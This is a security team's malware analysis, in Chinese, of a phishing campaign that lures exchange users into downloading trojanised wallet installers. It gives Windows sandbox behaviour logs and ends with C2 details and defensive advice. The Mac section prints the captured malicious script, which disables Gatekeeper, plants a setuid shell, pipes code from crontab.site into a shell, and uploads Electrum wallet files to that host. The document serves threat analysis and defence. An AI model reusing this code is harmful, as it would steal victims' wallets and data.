**作者：爱上平顶山@慢雾安全团队**  
**原文链接：<https://mp.weixin.qq.com/s/7MMXj8Lll4YkssOXoxdm4A>**

## **前言**

近日，慢雾安全团队收到情报，有专业黑产团队针对交易所用户进行大规模邮件批量撒网钓鱼攻击。

钓鱼邮件如图：

![](https://images.seebug.org/content/images/2020/06/65cdd921-b839-4649-bf8b-2c9761040a82.png-w331s)

慢雾安全团队收到情报后，第一时间展开分析。

以下是详细分析过程：

## **攻击细节**

我们点击跳转目标页面：

![](https://images.seebug.org/content/images/2020/06/d9b73923-678c-4823-8a72-8e4eb8f524cf.png-w331s)

从上图可以看到，针对 Mac OS X / macOS / Windows 不同系统都给出了下载链接；链接指向黑客木马文件存放位置。

![](https://images.seebug.org/content/images/2020/06/f6d6f6c5-94c2-4bc5-b728-f0b36bed56e5.png-w331s)

于3天前，创建的账号，里面存在两个项目：

  * b *****.github.io
  * b****t

![](https://images.seebug.org/content/images/2020/06/2ba41908-e10a-4a6d-9d88-ebcb1955bfcf.png-w331s)

上图样本 “Bi****-Setup.exe” 是 Windows 下的恶意文件。

![](https://images.seebug.org/content/images/2020/06/54a9aba2-7b90-4eb2-8461-c6a53433a87e.png-w331s)

“index.html” 是一个仿冒的升级提示页面，诱导用户升级下载。

## **详细分析**

接下来我们对Windows端和Mac端分别进行分析：

### **1.Windows 端** ：

下图为样本 “Bi****-Setup.exe” 数字签名：

![](https://images.seebug.org/content/images/2020/06/fde69521-9bcb-471d-aa20-128468c35279.png-w331s)

（1）EXE 文件基本信息

文件名称：B****-KYC-Setup.exe

子文件信息：

script.txt/877da6cdd4eb284e2d8887b24a24168c/Unknown

setup.exe/fe1818a5e8aed139a8ccf9f60312bb30/EXE

WinSCP.exe/e71c39688fad97b66af3e297a04c3663/EXE

（2）关键行为

行为描述： 屏蔽窗口关闭消息

详情信息：hWnd = 0x00030336, Text = Deep Onion Setup: Completed, ClassName = #32770

（3）进程行为

行为描述： 创建本地线程

详情信息：

    
    
    TargetProcess: %temp%\****.exe, InheritedFromPID = 2000, ProcessID = 2888, ThreadID = 2948, StartAddress = 00405209, Parameter = 0001034A
    
    TargetProcess: WinSCP.exe, InheritedFromPID = 2888, ProcessID = 3140, ThreadID = 3188, StartAddress = 008B9F7C, Parameter = 00000000
    
    TargetProcess: WinSCP.exe, InheritedFromPID = 2888, ProcessID = 3140, ThreadID = 3192, StartAddress = 00819BF4, Parameter = 0272E170
    
    TargetProcess: WinSCP.exe, InheritedFromPID = 2888, ProcessID = 3164, ThreadID = 3196, StartAddress = 008B9F7C, Parameter = 00000000
    
    TargetProcess: WinSCP.exe, InheritedFromPID = 2888, ProcessID = 3164, ThreadID = 3200, StartAddress = 00819BF4, Parameter = 0272E270
    
    TargetProcess: WinSCP.exe, InheritedFromPID = 2888, ProcessID = 3172, ThreadID = 3232, StartAddress = 008B9F7C, Parameter = 00000000
    
    TargetProcess: WinSCP.exe, InheritedFromPID = 2888, ProcessID = 3120, ThreadID = 3236, StartAddress = 008B9F7C, Parameter = 00000000
    
    TargetProcess: WinSCP.exe, InheritedFromPID = 2888, ProcessID = 3172, ThreadID = 3240, StartAddress = 00819BF4, Parameter = 0272E170
    
    TargetProcess: WinSCP.exe, InheritedFromPID = 2888, ProcessID = 3120, ThreadID = 3244, StartAddress = 00819BF4, Parameter = 0272E170
    
    TargetProcess: WinSCP.exe, InheritedFromPID = 2888, ProcessID = 3180, ThreadID = 3248, StartAddress = 008B9F7C, Parameter = 00000000
    
    TargetProcess: WinSCP.exe, InheritedFromPID = 2888, ProcessID = 3180, ThreadID = 3252, StartAddress = 00819BF4, Parameter = 0272E170
    
    TargetProcess: WinSCP.exe, InheritedFromPID = 2888, ProcessID = 3140, ThreadID = 3264, StartAddress = 009B8C28, Parameter = 026F4B90
    
    TargetProcess: WinSCP.exe, InheritedFromPID = 2888, ProcessID = 3164, ThreadID = 3280, StartAddress = 009B8C28, Parameter = 026F4C90
    
    TargetProcess: WinSCP.exe, InheritedFromPID = 2888, ProcessID = 3172, ThreadID = 3284, StartAddress = 009B8C28, Parameter = 026F4B90
    
    TargetProcess: WinSCP.exe, InheritedFromPID = 2888, ProcessID = 3120, ThreadID = 3352, StartAddress = 009B8C28, Parameter = 026F4B90

（4）行为描述： 创建新文件进程

详情信息：

    
    
    [0x00000c30]ImagePath = C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\.nsis_files\WinSCP.exe, CmdLine = "C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\.nsis_files\WinSCP.exe" /ini=null /script="script.txt" /log="winscp_documents.log" /loglevel=0 /parameter "C:\Documents and Settings\Administrator\My Documents" "09-06-2020-4:51:51_documents"
    
    [0x00000c44]ImagePath = C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\.nsis_files\WinSCP.exe, CmdLine = "C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\.nsis_files\WinSCP.exe" /ini=null /script="script.txt" /log="winscp_appdata.log" /loglevel=0 /parameter "C:\Documents and Settings\Administrator\Application Data" "09-06-2020-4:51:51_appdata"
    
    [0x00000c5c]ImagePath = C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\.nsis_files\WinSCP.exe, CmdLine = "C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\.nsis_files\WinSCP.exe" /ini=null /script="script.txt" /log="winscp_localappdata.log" /loglevel=0 /parameter "C:\Documents and Settings\Administrator\Local Settings\Application Data" "09-06-2020-4:51:51_localappdata"
    
    [0x00000c64]ImagePath = C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\.nsis_files\WinSCP.exe, CmdLine = "C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\.nsis_files\WinSCP.exe" /ini=null /script="script.txt" /log="winscp_onedrive.log" /loglevel=0 /parameter "C:\Documents and Settings\Administrator\OneDrive" "09-06-2020-4:51:51_onedrive"
    
    [0x00000c6c]ImagePath = C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\.nsis_files\WinSCP.exe, CmdLine = "C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\.nsis_files\WinSCP.exe" /ini=null /script="script.txt" /log="winscp_pictures.log" /loglevel=0 /parameter "C:\Documents and Settings\Administrator\Pictures" "09-06-2020-4:51:51_pictures"

（5）文件行为

行为描述： 创建文件

详情信息：

    
    
    C:\Documents and Settings\Administrator\Local Settings\Temp\nsi9.tmp
    
    C:\Documents and Settings\Administrator\Local Settings\Temp\.nsis_files\WinSCP.exe
    
    C:\Documents and Settings\Administrator\Local Settings\Temp\.nsis_files\script.txt
    
    C:\Documents and Settings\Administrator\Local Settings\Temp\.nsis_files\setup.exe
    
    C:\Documents and Settings\Administrator\Local Settings\Temp\nsyA.tmp
    
    C:\Documents and Settings\Administrator\Local Settings\Temp\nsyA.tmp\System.dll
    
    C:\Documents and Settings\Administrator\Application Data\winscp.rnd
    
    C:\Documents and Settings\Administrator\Local Settings\Temp\.nsis_files\winscp_appdata.log
    
    C:\Documents and Settings\Administrator\Local Settings\Temp\.nsis_files\winscp_onedrive.log
    
    C:\Documents and Settings\Administrator\Local Settings\Temp\.nsis_files\winscp_localappdata.log
    
    C:\Documents and Settings\Administrator\Local Settings\Temp\.nsis_files\winscp_documents.log
    
    C:\Documents and Settings\Administrator\Local Settings\Temp\.nsis_files\winscp_pictures.log
    
    C:\Documents and Settings\Administrator\Local Settings\Temp\.nsis_files\null

（6）行为描述： 创建可执行文件

详情信息：

    
    
    C:\Documents and Settings\Administrator\Local Settings\Temp\.nsis_files\setup.exe
    
    C:\Documents and Settings\Administrator\Local Settings\Temp\nsyA.tmp\System.dll

（7）行为描述： 覆盖已有文件

详情信息：

    
    
    C:\Documents and Settings\Administrator\Application Data\winscp.rnd
    
    C:\Documents and Settings\Administrator\Local Settings\Temp\.nsis_files\null

（8）行为描述： 查找文件

详情信息：

    
    
    FileName = C:\Documents and Settings
    
    FileName = C:\Documents and Settings\Administrator
    
    FileName = C:\Documents and Settings\Administrator\Local Settings
    
    FileName = C:\Documents and Settings\Administrator\Local Settings\Temp
    
    FileName = C:\Documents and Settings\Administrator\Local Settings\%temp%
    
    FileName = C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\nsyA.tmp
    
    FileName = C:\DOCUME~1
    
    FileName = C:\DOCUME~1\ADMINI~1
    
    FileName = C:\DOCUME~1\ADMINI~1\LOCALS~1
    
    FileName = C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp
    
    FileName = C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\.nsis_files\WinSCP.exe
    
    FileName = C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\.nsis_files\WinSCP.zh-CN
    
    FileName = C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\.nsis_files\WinSCP.zh-Hans
    
    FileName = C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\.nsis_files\WinSCP.zh
    
    FileName = C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\.nsis_files\WinSCP.CHS

（9）行为描述： 删除文件

详情信息：

    
    
    C:\Documents and Settings\Administrator\Local Settings\Temp\nsi9.tmp
    
    C:\Documents and Settings\Administrator\Local Settings\Temp\nsyA.tmp

（10）行为描述： 修改文件内容

详情信息：

    
    
    C:\Documents and Settings\Administrator\Local Settings\Temp\.nsis_files\WinSCP.exe ---> Offset = 0
    C:\Documents and Settings\Administrator\Local Settings\Temp\.nsis_files\WinSCP.exe ---> Offset = 32768
    C:\Documents and Settings\Administrator\Local Settings\Temp\.nsis_files\WinSCP.exe ---> Offset = 33203
    C:\Documents and Settings\Administrator\Local Settings\Temp\.nsis_files\WinSCP.exe ---> Offset = 65971
    C:\Documents and Settings\Administrator\Local Settings\Temp\.nsis_files\WinSCP.exe ---> Offset = 66905
    C:\Documents and Settings\Administrator\Local Settings\Temp\.nsis_files\script.txt ---> Offset = 0
    C:\Documents and Settings\Administrator\Local Settings\Temp\.nsis_files\setup.exe ---> Offset = 0
    C:\Documents and Settings\Administrator\Local Settings\Temp\.nsis_files\setup.exe ---> Offset = 24146
    C:\Documents and Settings\Administrator\Local Settings\Temp\.nsis_files\setup.exe ---> Offset = 44980
    C:\Documents and Settings\Administrator\Local Settings\Temp\.nsis_files\setup.exe ---> Offset = 60884
    C:\Documents and Settings\Administrator\Local Settings\Temp\.nsis_files\setup.exe ---> Offset = 93652
    C:\Documents and Settings\Administrator\Local Settings\Temp\nsyA.tmp\System.dll ---> Offset = 0
    C:\Documents and Settings\Administrator\Application Data\winscp.rnd ---> Offset = 0
    C:\Documents and Settings\Administrator\Local Settings\Temp\.nsis_files\winscp_appdata.log ---> Offset = 0
    C:\Documents and Settings\Administrator\Local Settings\Temp\.nsis_files\winscp_appdata.log ---> Offset = 102

（11）网络行为

行为描述： 建立到一个指定的套接字连接

详情信息：

IP: ##.138.40.##:128,SOCKET=0x000001d0

IP: ##.138.40.##:128,SOCKET=0x000001cc

我们测试打开，自解压:

![](https://images.seebug.org/content/images/2020/06/65cfff98-eae7-4222-a1bd-254fafc21c1d.png-w331s)

结果发现用于上传本地用户信息的 FTP 账号密码，同时有一个正常的 Electrum Installer 文件，一旦用户安装后使用， 在 Electrum
下输入的敏感信息将被发送到远程恶意 FTP 服务器接收。

![](https://images.seebug.org/content/images/2020/06/9bbac5e2-bdeb-4cc6-b165-955fc0044d41.png-w331s)

![](https://images.seebug.org/content/images/2020/06/b0e18bcf-62e0-4105-8d04-aaeffe3747c0.png-w331s)

2020年06月02日 开始，已经有用户陆续中招。

### **2.Mac 端：**

（1）安装命令：

![](https://images.seebug.org/content/images/2020/06/e951a473-ba21-4853-8d3f-32c74f818f5d.png-w331s)

（2）脚本内容：

![](https://images.seebug.org/content/images/2020/06/99ad176d-2cf2-4b17-a91b-1012ff679dee.png-w331s)

（3）恶意地址：<https://github.com/deep-onion>(模仿知名项目<https://deeponion.org/>
的Github地址 <https://github.com/deeponion> )

恶意地址下也有两个项目：

  1. deep-onion.github.io

  2. wallet

<https://github.com/deep-onion/deep-onion.github.io>

![](https://images.seebug.org/content/images/2020/06/47f9080e-bf62-40b9-a6c6-5fd830c5a5d1.png-w331s)

此文件此处不做分析。

（4）Mac 端

<https://github.com/deep-onion/wallet>

恶意文件是 DeepOnion

![](https://images.seebug.org/content/images/2020/06/9353566e-8610-427d-8ffe-f25538c85c05.png-w331s)

执行恶意脚本后是一系列恶意操作，

如：

    
    
    try {
      shell_exec("spctl --master-disable");
    
      $ksh = trim(shell_exec("which ksh"));
      shell_exec("cp $ksh $homedir/.ksh");
      shell_exec("cd $homedir && chown root:wheel .ksh && chmod a+rwxs .ksh");
    
      shell_exec("cd $homedir && echo '#!/bin/bash' > .strtp && echo 'sleep 300' >> .strtp && echo 'curl http://crontab.site/?log=startup\&key=startup\&id=$id | $homedir/.ksh' >> .strtp && chown root:wheel .strtp && chmod a+x .strtp");
    
    try {
       $dir = "$homedir/.electrum/wallets";
       if (file_exists($dir)) {
          $files = scandir($dir);
          foreach ($files as $file) {
             shell_exec("curl -s --data-binary \"@$dir/$file\" http://crontab.site/?log=startup\&key=$file\&id=$id");
          }
       }
    } catch (Exception $e) {
       shell_exec('echo "Caught exception: ' . $e->getMessage() . '"' . " >> $log");
    }
    
    shell_exec("curl -s --data-binary \"@$log\" http://crontab.site/?log=startup\&key=log\&id=$id");
    
    whoami >> /tmp/cron.log
    ls -al /Users/ >> /tmp/cron.log
    ls -al $HOMEDIR >> /tmp/cron.log
    curl --data-binary "@/tmp/cron.log" http://crontab.site/?log=startup\&key=cron.log\&id=$UID

## **大致流程**

![](https://images.seebug.org/content/images/2020/06/6bed1f6c-e464-43cd-9d78-2538b2f9d17b.png-w331s)

通过以上一些列操作，从而盗取用户隐私信息。

**备注：**

C2 信息：

crontab.site

邮箱 alashanvinov@yandex.ru

phone_tag +7.9453949549

注册时间 2020-04-20 17:47:03

过期时间 2021-04-20 23:59:59

更新时间 2020-04-20 17:47:04

## **慢雾建议**

针对本次攻击事件慢雾安全团队建议：

  * 认清官方邮箱后缀
  * 谨慎对待未知来源邮件里的链接与附件
  * 怀疑一切以“升级”、“账号异常”等理由的邮件
  * 对于需要处理但可疑的邮件内容，需及时咨询专业人员

* * *

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1240/>

